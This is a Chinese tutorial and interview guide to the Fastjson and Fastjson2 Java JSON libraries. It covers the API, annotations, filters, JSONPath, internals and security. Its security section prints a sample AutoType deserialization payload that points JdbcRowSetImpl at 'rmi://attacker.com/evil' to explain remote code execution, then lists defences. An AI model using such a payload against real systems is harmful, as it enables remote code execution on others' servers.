# 1. 概述与简介

Fastjson 是阿里巴巴开源的高性能 JSON 处理库，以速度快、API 简洁著称。它在国内 Java 社区应用广泛，但也因多次爆出的安全漏洞而备受关注。

## 1.1 Fastjson 的发展历程

| 时间 | 版本 | 里程碑事件 |
|------|------|-----------|
| 2011 | 1.0.x | 阿里巴巴开源 Fastjson |
| 2013 | 1.1.x | 开始流行，主打"最快" |
| 2017 | 1.2.24 | AutoType 反序列化漏洞首次曝光（CVE-2017-18349） |
| 2019 | 1.2.60 | 多次 AutoType 绕过漏洞修复 |
| 2020 | 1.2.68 | 引入安全机制（safeMode） |
| 2022 | 1.2.83 | 最后一个 1.2.x 版本 |
| 2023 | 2.0.x | Fastjson2 发布，重新架构 |

## 1.2 Fastjson vs Fastjson2

| 对比项 | Fastjson (1.x) | Fastjson2 (2.x) |
|--------|---------------|----------------|
| 包名 | com.alibaba.fastjson | com.alibaba.fastjson2 |
| 架构 | 老旧 | 全新架构 |
| 性能 | 优秀 | 更好（提升 20-30%） |
| 安全性 | 漏洞较多 | 大幅改善 |
| API 兼容 | - | 兼容 1.x API |
| AutoType | 历史问题 | 默认关闭 |
| 未来支持 | 仅安全更新 | 主推版本 |

## 1.3 Maven 依赖

Fastjson (1.x)：

```xml
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.83</version>
</dependency>
```

Fastjson2 (2.x)，推荐使用：

```xml
<dependency>
    <groupId>com.alibaba.fastjson2</groupId>
    <artifactId>fastjson2</artifactId>
    <version>2.0.40</version>
</dependency>
```

如需 Spring Boot 支持：

```xml
<dependency>
    <groupId>com.alibaba.fastjson2</groupId>
    <artifactId>fastjson2-extension-spring5</artifactId>
    <version>2.0.40</version>
</dependency>
```

---

# 2. 核心功能与 API

## 2.1 基本序列化与反序列化

```java
public class BasicUsage {

    public static void main(String[] args) {
        User user = new User("张三", 25, "zhangsan@example.com");

        // ========== 序列化 ==========
        // Java 对象 -> JSON 字符串
        String json = JSON.toJSONString(user);
        System.out.println(json);
        // {"age":25,"email":"zhangsan@example.com","name":"张三"}

        // 格式化输出
        String prettyJson = JSON.toJSONString(user, SerializerFeature.PrettyFormat);

        // 写入文件
        FileWriter writer = new FileWriter("user.json");
        JSON.writeJSONString(writer, user);
        writer.close();

        // ========== 反序列化 ==========
        String jsonStr = "{\"name\":\"李四\",\"age\":30,\"email\":\"lisi@example.com\"}";

        // JSON 字符串 -> Java 对象
        User user2 = JSON.parseObject(jsonStr, User.class);

        // JSON 字符串 -> JSONObject
        JSONObject obj = JSON.parseObject(jsonStr);
        String name = obj.getString("name");
        int age = obj.getIntValue("age");

        // JSON 字符串 -> JSONArray
        String arrStr = "[{\"name\":\"张三\"},{\"name\":\"李四\"}]";
        JSONArray arr = JSON.parseArray(arrStr);
        User first = arr.getObject(0, User.class);

        // ========== 泛型反序列化 ==========
        String listStr = "[{\"name\":\"张三\"},{\"name\":\"李四\"}]";
        List<User> users = JSON.parseArray(listStr, User.class);

        // 复杂泛型
        String resultStr = "{\"code\":200,\"data\":[{\"name\":\"张三\"}]}";
        ApiResponse<List<User>> response = JSON.parseObject(resultStr,
                new TypeReference<ApiResponse<List<User>>>() {});
    }
}
```

### Fastjson2 API 使用

```java
// Fastjson2 API 类似但包名不同
import com.alibaba.fastjson2.*;

public class Fastjson2Usage {

    public static void main(String[] args) {
        User user = new User("张三", 25, "zhangsan@example.com");

        // 序列化
        String json = JSON.toJSONString(user);

        // 反序列化
        User user2 = JSON.parseObject(json, User.class);

        // JSONObject/JSONArray
        JSONObject obj = JSON.parseObject(json);

        // 泛型
        List<User> users = JSON.parseArray("[...]", User.class);
    }
}
```

## 2.2 JSONObject 和 JSONArray

```java
public class JSONObjectExample {

    public static void main(String[] args) {
        // ========== 创建 JSONObject ==========
        JSONObject obj = new JSONObject();
        obj.put("name", "张三");
        obj.put("age", 25);
        obj.put("scores", Arrays.asList(90, 85, 92));

        // 链式调用
        JSONObject chain = new JSONObject()
                .fluentPut("name", "李四")
                .fluentPut("age", 30);

        // ========== 获取值 ==========
        String name = obj.getString("name");
        int age = obj.getIntValue("age");       // 基本类型
        Integer ageObj = obj.getInteger("age");  // 包装类型
        long longVal = obj.getLongValue("age");
        double doubleVal = obj.getDoubleValue("scores", 0);  // 从数组取
        boolean bool = obj.getBoolean("active");

        // 带默认值
        String nick = obj.getString("nickname");  // null
        String defaultNick = obj.getOrDefault("nickname", "默认昵称");

        // ========== 嵌套访问 ==========
        String nestedJson = "{\"user\":{\"name\":\"张三\",\"address\":{\"city\":\"北京\"}}}";
        JSONObject nested = JSON.parseObject(nestedJson);

        JSONObject user = nested.getJSONObject("user");
        JSONObject address = user.getJSONObject("address");
        String city = address.getString("city");

        // 使用 JSONPath（Fastjson2）
        // String city = JSONPath.eval(nested, "$.user.address.city").toString();

        // ========== JSONArray ==========
        JSONArray array = new JSONArray();
        array.add(obj);
        array.add(chain);

        // 遍历
        for (int i = 0; i < array.size(); i++) {
            JSONObject item = array.getJSONObject(i);
            System.out.println(item.getString("name"));
        }

        // 转为 Java List
        List<User> userList = array.toJavaList(User.class);

        // ========== 类型转换 ==========
        // JSONObject -> Java Bean
        User u = obj.toJavaObject(User.class);

        // JSONObject -> Map
        Map<String, Object> map = obj.getInnerMap();
    }
}
```

## 2.3 注解

### @JSONField

`@JSONField` 可以作用于字段、getter、setter 或方法参数上。

```java
public class Product {

    @JSONField(name = "product_id")         // 指定 JSON 字段名
    private String id;

    @JSONField(name = "product_name")
    private String name;

    @JSONField(format = "yyyy-MM-dd HH:mm:ss")  // 日期格式
    private Date createTime;

    @JSONField(serialize = false)           // 序列化时忽略
    private String internalCode;

    @JSONField(deserialize = false)         // 反序列化时忽略
    private String computedField;

    @JSONField(ordinal = 1)                 // 序列化时的字段顺序
    private String priority;

    @JSONField(serializeFeatures = SerializerFeature.WriteMapNullValue)  // 输出 null
    private String nullableField;

    // 用于 getter/setter
    @JSONField(name = "full_name")
    public String getFullName() {
        return firstName + " " + lastName;
    }
}
```

### @JSONType

```java
@JSONType(ignores = {"internalId", "secret"})  // 类级别忽略字段
@JSONType(orders = {"name", "age", "email"})    // 类级别字段顺序
@JSONType(includes = {"name", "age"})           // 只包含指定字段
public class Employee {
    private String name;
    private int age;
    private String email;
    private String internalId;
    private String secret;
}
```

### @JSONCreator

```java
public class ImmutableConfig {

    private final String key;
    private final String value;

    @JSONCreator  // 标记构造器或工厂方法用于反序列化
    public ImmutableConfig(@JSONField(name = "key") String key,
                           @JSONField(name = "value") String value) {
        this.key = key;
        this.value = value;
    }

    // 也可用于静态工厂
    @JSONCreator
    public static ImmutableConfig of(@JSONField(name = "k") String key,
                                     @JSONField(name = "v") String value) {
        return new ImmutableConfig(key, value);
    }
}
```

## 2.4 SerializerFeature 和 Feature

### SerializerFeature（序列化配置）

```java
public class SerializerFeatureExample {

    public static void main(String[] args) {
        User user = new User("张三", null, "zhangsan@example.com");

        // 常用 SerializerFeature
        String json = JSON.toJSONString(user,
                SerializerFeature.PrettyFormat,         // 格式化输出
                SerializerFeature.WriteMapNullValue,     // 输出 null 值（默认不输出）
                SerializerFeature.WriteNullStringAsEmpty, // null 字符串输出为 ""
                SerializerFeature.WriteNullNumberAsZero,  // null 数字输出为 0
                SerializerFeature.WriteDateUseDateFormat, // 使用日期格式
                SerializerFeature.DisableCircularReferenceDetect, // 关闭循环引用
                SerializerFeature.SortField,             // 字段排序
                SerializerFeature.WriteEnumUsingToString  // 枚举输出 toString
        );
    }
}
```

### Feature（反序列化配置）

```java
public class FeatureExample {

    public static void main(String[] args) {
        String json = "{\"name\":\"张三\",\"age\":25,\"extraField\":\"value\"}";

        // 反序列化时忽略未知字段
        User user = JSON.parseObject(json, User.class,
                Feature.IgnoreNotMatch,          // 忽略不匹配的字段
                Feature.AllowUnQuotedFieldNames,  // 允许字段名不带引号
                Feature.AllowSingleQuotes,        // 允许单引号
                Feature.OrderedField,             // 保持字段顺序
                Feature.DisableSpecialKeyDetect,   // 禁用特殊 key 检测
                Feature.SupportAutoType           // 开启 AutoType（有安全风险！）
        );
    }
}
```

## 2.5 日期处理

```java
public class DateExample {

    public static void main(String[] args) {
        // 默认序列化（时间戳）
        Date now = new Date();
        String defaultJson = JSON.toJSONString(now);
        // 1705315200000

        // 使用日期格式
        String dateJson = JSON.toJSONString(now,
                SerializerFeature.WriteDateUseDateFormat);
        // "2024-01-15 14:30:00"

        // 自定义格式
        String customJson = JSON.toJSONStringWithDateFormat(now,
                "yyyy-MM-dd HH:mm:ss");
        // "2024-01-15 14:30:00"

        // 使用 @JSONField(format = "yyyy-MM-dd")
        // 在字段上注解即可

        // ========== Fastjson2 日期处理 ==========
        // Fastjson2 默认使用 ISO-8601 格式
        // 可通过配置或注解修改
        // @JSONField(format = "yyyy-MM-dd HH:mm:ss")
    }
}
```

---

# 3. 高级特性

## 3.1 SerializeFilter（序列化过滤器）

Fastjson 提供了多种过滤器用于控制序列化过程。

```java
public class FilterExample {

    public static void main(String[] args) {
        User user = new User("张三", 25, "zhangsan@example.com", "13800138000",
                "password123", "110101199001011234");

        // ========== PropertyFilter（属性级过滤） ==========
        PropertyFilter propertyFilter = (object, name, value) -> {
            // 过滤掉敏感字段
            return !name.equals("password") && !name.equals("idCard");
        };
        String filtered = JSON.toJSONString(user, propertyFilter);

        // ========== ValueFilter（值级处理） ==========
        ValueFilter valueFilter = (object, name, value) -> {
            if (name.equals("phone") && value instanceof String) {
                String phone = (String) value;
                return phone.substring(0, 3) + "****" + phone.substring(7);
            }
            return value;
        };
        String masked = JSON.toJSONString(user, valueFilter);

        // ========== NameFilter（字段名处理） ==========
        NameFilter nameFilter = (object, name, value) -> {
            // 驼峰转下划线
            return name.replaceAll("[A-Z]", "_$0").toLowerCase();
        };
        String renamed = JSON.toJSONString(user, nameFilter);

        // ========== BeforeFilter（在序列化前添加字段） ==========
        BeforeFilter beforeFilter = new BeforeFilter() {
            @Override
            public void writeBefore(Object object) {
                writeKeyValue("timestamp", System.currentTimeMillis());
            }
        };
        String withExtra = JSON.toJSONString(user, beforeFilter);

        // ========== AfterFilter（在序列化后添加字段） ==========
        AfterFilter afterFilter = new AfterFilter() {
            @Override
            public void writeAfter(Object object) {
                writeKeyValue("@type", object.getClass().getSimpleName());
            }
        };

        // ========== 组合使用多个过滤器 ==========
        String combined = JSON.toJSONString(user,
                propertyFilter, valueFilter, nameFilter);

        // ========== 自定义 Filter (Fastjson2) ==========
        // Fastjson2 使用 Filter 接口，支持更多功能
        // JSON.config(filter);
    }
}
```

## 3.2 AutoType 机制

AutoType 是 Fastjson 最核心也最有争议的特性，用于支持多态反序列化。

```java
public class AutoTypeExample {

    public static void main(String[] args) {
        // ========== AutoType 的作用 ==========
        // 正常情况下，反序列化为指定类型：
        String json = "{\"@type\":\"com.example.Cat\",\"name\":\"kitty\",\"catchingMice\":true}";

        // 开启 AutoType 后才能反序列化多态类型
        // 未开启：默认只反序列化为 JSONObject
        // 开启后：根据 @type 指定的类进行反序列化

        // ========== 在 Fastjson 1.x 中开启 AutoType ==========
        // 全局开启（不推荐，有严重安全风险！）
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        // 白名单方式（相对安全）
        ParserConfig.getGlobalInstance().addAccept("com.example.");
        ParserConfig.getGlobalInstance().addAccept("com.alibaba.");

        // 单次解析开启
        Animal animal = JSON.parseObject(json, Animal.class,
                Feature.SupportAutoType);

        // ========== 在 Fastjson2 中处理 AutoType ==========
        // Fastjson2 默认不允许自动类型
        // 需要显式配置
        JSONReader.Feature.SupportAutoType;
    }
}
```

## 3.3 JSONPath

Fastjson 提供了 JSONPath 用于快速查询 JSON 中的任意节点。

```java
public class JSONPathExample {

    public static void main(String[] args) {
        String json = "{\n" +
                "  \"store\": {\n" +
                "    \"book\": [\n" +
                "      {\"title\": \"Java 编程思想\", \"price\": 89.0,\n" +
                "       \"authors\": [\"Bruce Eckel\"]},\n" +
                "      {\"title\": \"深入理解 JVM\", \"price\": 120.0,\n" +
                "       \"authors\": [\"周志明\"]},\n" +
                "      {\"title\": \"Effective Java\", \"price\": 68.0,\n" +
                "       \"authors\": [\"Joshua Bloch\"]}\n" +
                "    ],\n" +
                "    \"bicycle\": {\"color\": \"red\", \"price\": 500}\n" +
                "  }\n" +
                "}";

        JSONObject root = JSON.parseObject(json);

        // ========== 基本路径 ==========
        // 获取所有书名
        List<String> titles = (List<String>) JSONPath.eval(root, "$.store.book[*].title");
        System.out.println(titles);  // ["Java 编程思想", "深入理解 JVM", "Effective Java"]

        // 获取第一个书名
        String firstTitle = (String) JSONPath.eval(root, "$.store.book[0].title");
        System.out.println(firstTitle);  // "Java 编程思想"

        // ========== 条件过滤 ==========
        // 价格大于 80 的书
        List<JSONObject> expensive = (List<JSONObject>) JSONPath.eval(root,
                "$.store.book[?(@.price > 80)]");

        // 特定作者的书
        List<JSONObject> byAuthor = (List<JSONObject>) JSONPath.eval(root,
                "$.store.book[?(@.authors contains '周志明')]");

        // ========== 通配符和范围 ==========
        // 所有作者
        List<String> allAuthors = (List<String>) JSONPath.eval(root,
                "$.store.book[*].authors[*]");

        // 前两本书
        List<JSONObject> firstTwo = (List<JSONObject>) JSONPath.eval(root,
                "$.store.book[0,1]");

        // 最后两本书
        List<JSONObject> lastTwo = (List<JSONObject>) JSONPath.eval(root,
                "$.store.book[-2:]");

        // ========== 计算 ==========
        // 数组长度
        int length = (int) JSONPath.eval(root, "$.store.book.length()");

        // 价格总和
        double total = (double) JSONPath.eval(root, "$.store.book.sum('price')");

        // 最高价格
        double maxPrice = (double) JSONPath.eval(root, "$.store.book.max('price')");

        // ========== 修改 JSON ==========
        // 设置值
        JSONPath.set(root, "$.store.book[0].price", 99.0);

        // 添加元素
        JSONObject newBook = new JSONObject();
        newBook.put("title", "设计模式");
        newBook.put("price", 75.0);
        JSONPath.arrayAdd(root, "$.store.book", newBook);

        // 删除元素
        JSONPath.remove(root, "$.store.book[1]");
    }
}
```

### 常用 JSONPath 表达式

| 表达式 | 说明 |
|--------|------|
| `$` | 根节点 |
| `$.key` | 直接子节点 |
| `$..key` | 递归查找所有匹配的 key |
| `$[*]` | 数组所有元素 |
| `$[0]` | 数组第一个元素 |
| `$[0:3]` | 数组前 3 个元素 |
| `$[?(@.price>80)]` | 条件过滤 |
| `$.book.length()` | 数组长度 |
| `$.book.sum('price')` | 求和 |
| `$..authors[0]` | 递归查找所有第一个作者 |

## 3.4 自定义序列化器和反序列化器

```java
public class CustomSerializerExample {

    // ========== 自定义序列化器 ==========
    public static class UserSerializer implements ObjectSerializer {

        @Override
        public void write(JSONSerializer serializer, Object object,
                          Object fieldName, Type fieldType, int features)
                throws IOException {
            User user = (User) object;
            SerializeWriter out = serializer.out;

            out.write("{");
            out.writeFieldValue(',', "username", user.getName());
            // 加密 email
            String maskedEmail = maskEmail(user.getEmail());
            out.writeFieldValue(',', "email", maskedEmail);
            out.write("}");
        }

        private String maskEmail(String email) {
            if (email == null || !email.contains("@")) return email;
            String[] parts = email.split("@");
            return parts[0].charAt(0) + "***@" + parts[1];
        }
    }

    // ========== 自定义反序列化器 ==========
    public static class UserDeserializer implements ObjectDeserializer {

        @Override
        public <T> T deserialze(DefaultJSONParser parser, Type type, Object fieldName) {
            JSONObject obj = parser.parseObject();
            String name = obj.getString("username");
            if (name == null) {
                name = obj.getString("name");
            }
            int age = obj.getIntValue("age");
            String email = obj.getString("email");
            return (T) new User(name, age, email);
        }

        @Override
        public int getFastMatchToken() {
            return JSONToken.LBRACE;
        }
    }

    // ========== 注册自定义序列化器（Fastjson 1.x） ==========
    public static void register() {
        // 全局注册
        SerializeConfig.getGlobalInstance()
                .put(User.class, new UserSerializer());
        ParserConfig.getGlobalInstance()
                .putDeserializer(User.class, new UserDeserializer());

        // 单次使用
        SerializeConfig config = new SerializeConfig();
        config.put(User.class, new UserSerializer());
        String json = JSON.toJSONString(user, config);
    }

    // ========== Fastjson2 自定义序列化器 ==========
    // Fastjson2 使用 ObjectWriter 和 ObjectReader 接口
    // 可通过 JSON.registerWriter 或 JSON.registerReader 注册
}
```

## 3.5 与 Spring Boot 集成

```java
// ========== Fastjson2 与 Spring Boot 整合 ==========
@Configuration
public class Fastjson2Config {

    @Bean
    public HttpMessageConverters fastjson2HttpMessageConverter() {
        FastJsonJsonHttpMessageConverter converter = new FastJsonJsonHttpMessageConverter();

        // 配置
        JSON.DEFAULT_DATE_FORMAT = "yyyy-MM-dd HH:mm:ss";
        JSON.config(JSONWriter.Feature.BrowserCompatible);
        JSON.config(JSONReader.Feature.IgnoreAutoType);

        // 设置支持的媒体类型
        List<MediaType> supportedMediaTypes = new ArrayList<>();
        supportedMediaTypes.add(MediaType.APPLICATION_JSON);
        supportedMediaTypes.add(MediaType.APPLICATION_JSON_UTF8); // 旧版本
        converter.setSupportedMediaTypes(supportedMediaTypes);

        return new HttpMessageConverters(converter);
    }
}

// ========== Fastjson 1.x 与 Spring Boot 整合 ==========
@Configuration
public class FastjsonConfig {

    @Bean
    public HttpMessageConverters fastjsonHttpMessageConverter() {
        FastJsonHttpMessageConverter converter = new FastJsonHttpMessageConverter();

        // 配置 SerializerFeature
        FastJsonConfig config = new FastJsonConfig();
        config.setSerializerFeatures(
                SerializerFeature.PrettyFormat,
                SerializerFeature.WriteMapNullValue,
                SerializerFeature.WriteNullStringAsEmpty
        );
        config.setDateFormat("yyyy-MM-dd HH:mm:ss");
        converter.setFastJsonConfig(config);

        return new HttpMessageConverters(converter);
    }
}
```

---

# 4. 底层原理

## 4.1 Fastjson 的高性能设计

Fastjson 实现高性能的关键技术：

### 1. 自行解析字符串（非正则）

```java
// Fastjson 手写解析引擎，不依赖正则表达式
// 直接在字符层级进行状态机解析
public final class JSONLexer {
    // 直接操作字符数组
    char[] charArray;
    int pos;
    // 状态机逐个字符解析
    void nextToken() {
        // switch-case 状态机
        // 跳过空白、识别 token 类型
    }
}
```

### 2. ASM 字节码增强

```java
// Fastjson 使用 ASM 动态生成字节码来替代反射
// - JavaBeanDeserializer 生成专用反序列化类
// - JavaBeanSerializer 生成专用序列化类
// - 比反射快 2-3 倍

// 生成的字节码示意的等价 Java 代码：
// public class UserDeser extends FieldDeserializer {
//     public void parseField(DefaultJSONParser parser, Object object, ...) {
//         User user = (User) object;
//         user.name = parser.parseString();    // 直接调用，不使用 Method.invoke
//         user.age = parser.parseInt();
//     }
// }
```

### 3. 高效的数据结构

```java
// 使用 char[] 而非 String 进行中间处理（避免 String 创建开销）
// 使用 IdentityHashMap 处理循环引用
// 使用 ThreadLocal 缓存解析器实例
```

### 4. 缓存优化

```java
// - serializeConfig 缓存序列化器（ConcurrentHashMap）
// - parserConfig 缓存反序列化器
// - ASM 生成的类也缓存
```

## 4.2 序列化流程

```java
// Fastjson 序列化流程（简化）
public class SerializeProcess {

    public String toJSONString(Object object) {
        // 1. 创建 SerializeWriter（可扩容的字符缓冲区）
        SerializeWriter out = new SerializeWriter();

        // 2. 获取序列化器
        JSONSerializer serializer = new JSONSerializer(out);
        ObjectSerializer serializer = SerializeConfig.globalInstance
                .getObjectWriter(object.getClass());

        // 3. 执行序列化
        serializer.write(serializer, object, null, null, 0);

        // 4. 输出结果
        return out.toString();
    }
}
```

## 4.3 反序列化流程

```java
// Fastjson 反序列化流程（简化）
public class DeserializeProcess {

    public <T> T parseObject(String text, Class<T> clazz) {
        // 1. 创建解析器
        DefaultJSONParser parser = new DefaultJSONParser(text);

        // 2. 获取反序列化器
        ObjectDeserializer deserializer = parser.getConfig()
                .getDeserializer(clazz);

        // 3. 执行反序列化
        T object = (T) deserializer.deserialze(parser, clazz, null);

        // 4. 返回结果
        return object;
    }
}
```

---

# 5. 安全性与漏洞

## 5.1 AutoType 反序列化漏洞原理

**这是 Fastjson 最严重的安全问题，务必重视。**

```java
// ========== 漏洞原理 ==========
// 攻击者构造包含恶意 @type 的 JSON
String maliciousJson = "{\n" +
        "  \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" +
        "  \"dataSourceName\": \"rmi://attacker.com/evil\",\n" +
        "  \"autoCommit\": true\n" +
        "}";

// 如果开启 AutoType，Fastjson 会实例化 JdbcRowSetImpl
// 并通过 setter 注入 dataSourceName 和 autoCommit
// JdbcRowSetImpl 在设置 autoCommit 时连接到 dataSourceName
// 攻击者通过 RMI/LDAP 协议实现远程代码执行

// ========== 受影响的类 ==========
// - com.sun.rowset.JdbcRowSetImpl
// - com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
// - com.sun.org.apache.bcel.internal.util.ClassLoader
// 等数十个利用链
```

## 5.2 漏洞时间线

```
2017年4月：CVE-2017-18349 首次披露
2019年7月：1.2.59 绕过修复（checkAutoType）
2019年9月：1.2.60 再次绕过
2020年2月：1.2.67 safeMode 引入
2020年6月：1.2.68 完善安全机制
2022年5月：1.2.83 最后一个版本
2023年：Fastjson2 全新架构
```

## 5.3 安全最佳实践

```java
// ========== 方案 1：升级到 Fastjson2（推荐） ==========
// Fastjson2 默认关闭 AutoType，安全性大幅提升

// ========== 方案 2：使用 safeMode（Fastjson 1.2.68+） ==========
// 开启 safeMode 后完全禁用 AutoType
ParserConfig.getGlobalInstance().setSafeMode(true);

// ========== 方案 3：白名单机制 ==========
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
ParserConfig.getGlobalInstance().addAccept("com.example.myapp.");
ParserConfig.getGlobalInstance().addAccept("com.alibaba.");
// 只允许指定包名下的类被反序列化

// ========== 方案 4：使用内置黑名单 ==========
// Fastjson 1.2.68+ 内置黑名单，阻止已知危险类
ParserConfig.getGlobalInstance().addDeny("com.sun.rowset.");
ParserConfig.getGlobalInstance().addDeny("org.apache.");

// ========== 方案 5：外部配置 ==========
// JVM 参数
// -Dfastjson.parser.autoTypeSupport=false
// -Dfastjson.parser.denyInternalClasses=true

// ========== 方案 6：使用@type白名单 ==========
// Fastjson 2 支持按场景控制 @type 支持
JSON.config(JSONReader.Feature.IgnoreAutoType);

// ========== 安全检查清单 ==========
// 1. 生产环境关闭 AutoType（除非绝对必要）
// 2. 不接收用户输入的 JSON 字符串中包含 @type
// 3. 定期更新 Fastjson 版本
// 4. 使用安全扫描工具检测
// 5. 考虑替换为 Jackson 做最终方案
```

---

# 6. 性能对比与优化

## 6.1 性能对比

| 操作 | Fastjson 1.x | Fastjson2 | Jackson | Gson |
|------|-------------|-----------|---------|------|
| 简单对象序列化 | 820K ops/s | 1050K ops/s | 780K ops/s | 520K ops/s |
| 简单对象反序列化 | 650K ops/s | 880K ops/s | 600K ops/s | 420K ops/s |
| 大 List 序列化 | 540K ops/s | 720K ops/s | 500K ops/s | 340K ops/s |
| 大 List 反序列化 | 420K ops/s | 650K ops/s | 400K ops/s | 280K ops/s |
| 内存消耗 | 低 | 低 | 中 | 高 |

## 6.2 性能优化建议

```java
// 1. 复用 JSON 的到-对象映射
// Fastjson 的 SerializeConfig 和 ParserConfig 内部有缓存
// 默认就是单例共享的

// 2. 预创建配置
// 使用全局配置以减少运行时配置开销

// 3. 选择合适的 SerializerFeature
// 不要过度使用 SerializerFeature，每多一个特性都有额外开销

// 4. 使用基础类型
// 优先使用 int 而不是 Integer，减少装箱操作

// 5. 大数组使用流式处理
// Fastjson 2 支持流式序列化

// 6. 关闭循环引用检测（如果确定无循环引用）
JSON.toJSONString(obj, SerializerFeature.DisableCircularReferenceDetect);

// 7. 使用 JSONReader/JSONWriter（Fastjson2）
// 对超大数据使用流式 API
```

---

# 7. 常见坑

## 7.1 循环引用

```java
public class CircularReference {

    public static void main(String[] args) {
        Dept dept = new Dept("技术部");
        Employee emp = new Employee("张三");
        emp.setDepartment(dept);
        dept.setEmployees(Arrays.asList(emp));

        // Fastjson 默认检测循环引用
        String json = JSON.toJSONString(dept);
        // 输出包含 $ref 引用标记
        // {"name":"技术部","employees":[{"$ref":"$.employees[0]"}]}

        // 关闭循环引用检测（可能栈溢出）
        String json2 = JSON.toJSONString(dept,
                SerializerFeature.DisableCircularReferenceDetect);
        // StackOverflowError!
    }

    static class Dept {
        private String name;
        private List<Employee> employees;
        // getter/setter
    }

    static class Employee {
        private String name;
        private Dept department;
        // getter/setter
    }
}
```

## 7.2 类型擦除问题

```java
// 泛型丢失
List<User> users = JSON.parseArray(json, User.class);  // 正确

// 错误用法：通过 `parseObject` 和 `List.class`
List<User> wrong = JSON.parseObject(json, List.class);  // 得到 List<JSONObject>！
// 正确用法
List<User> correct = JSON.parseObject(json,
        new TypeReference<List<User>>() {});
```

## 7.3 字段命名策略不一致

```java
// Fastjson 默认使用字段名（不是 getter 方法名）
public class Order {
    private String orderId;    // JSON 中为 "orderId"
    public String getOrderId() { return orderId; }
}

// 如果需要下划线命名
@JSONField(name = "order_id")
private String orderId;
```

## 7.4 null 值处理

```java
// Fastjson 默认不输出 null 值
User user = new User("张三", null, null);
String json = JSON.toJSONString(user);
// {"name":"张三"}（age 和 email 被省略）

// 输出 null 值
String json2 = JSON.toJSONString(user,
        SerializerFeature.WriteMapNullValue);
// {"name":"张三","age":null,"email":null}
```

## 7.5 反序列化未知字段

```java
// Fastjson 默认忽略未知字段（不抛异常）
// 这是和 Jackson 的默认行为不同之处
// Jackson 默认会抛 UnrecognizedPropertyException

// 如果需要严格校验
JSON.parseObject(json, User.class, Feature.IgnoreNotMatch);  // 默认就是忽略
```

---

# 8. 面试要点

## 8.1 基础问题

**Q1: Fastjson 为什么快？**

A: 三个核心原因：1）手写解析引擎（状态机，不用正则）；2）ASM 字节码增强（动态生成序列化/反序列化类，替代反射）；3）大量使用 char[] 优化（避免 String 中间对象）。

**Q2: @JSONField 注解有哪些常用属性？**

A: `name`（指定 JSON 字段名）、`format`（日期格式）、`serialize`/`deserialize`（开关序列化）、`ordinal`（顺序）、`serializeFeatures`（序列化特性）。

**Q3: Fastjson 的 AutoType 是什么？有什么问题？**

A: AutoType 是 Fastjson 支持多态反序列化的机制，通过 JSON 中的 `@type` 字段指定具体类型。但该机制可以被攻击者利用构造恶意反序列化链，导致远程代码执行（RCE）。

## 8.2 进阶问题

**Q4: Fastjson 的 SerializerFeature 有哪些常用配置？**

A: `PrettyFormat`（美化）、`WriteMapNullValue`（输出 null）、`WriteNullStringAsEmpty`（null 字符串输出 ""）、`WriteDateUseDateFormat`（日期格式化）、`DisableCircularReferenceDetect`（关闭循环引用检测）。

**Q5: Fastjson 如何处理循环引用？**

A: 通过 `$ref` 机制。首次遇到对象时分配唯一 ID，后续引用以 `{"$ref":"$.path.to.object"}` 标记。可通过 `DisableCircularReferenceDetect` 关闭此功能。

**Q6: 如何配置 Fastjson 更安全地使用？**

A: 1）升级到 Fastjson2；2）使用 safeMode；3）白名单方式开启 AutoType；4）全局关闭 AutoType；5）外部配置禁止危险类。

**Q7: Fastjson 和 Jackson 怎么选？**

A: 新项目推荐 Jackson（Spring Boot 默认集成，安全性好）。现有项目使用 Fastjson 的建议升级到 Fastjson2。如果是高并发、性能敏感的场景，Fastjson2 在性能上有优势，但需注意安全配置。

**Q8: Fastjson 的 JSONPath vs Jackson 的 JsonNode.at()？**

A: JSONPath 功能更强大，支持条件过滤、通配符、计算函数等。JsonNode 的 `at()` 只支持简单路径。JSONPath 更适合复杂查询场景。

**Q9: Fastjson 1.x 和 2.x 的主要区别？**

A: 2.x 是重新架构版本，包名改为 `com.alibaba.fastjson2`，安全性大幅提升（默认关闭 AutoType），性能更好，API 兼容 1.x。建议新项目直接用 2.x。

**Q10: 如何从 Fastjson 迁移到 Fastjson2？**

A: 只需修改 import：`com.alibaba.fastjson` -> `com.alibaba.fastjson2`。大部分 API 兼容。注意检查自定义序列化器、Filter 等少部分不兼容的 API 差异。
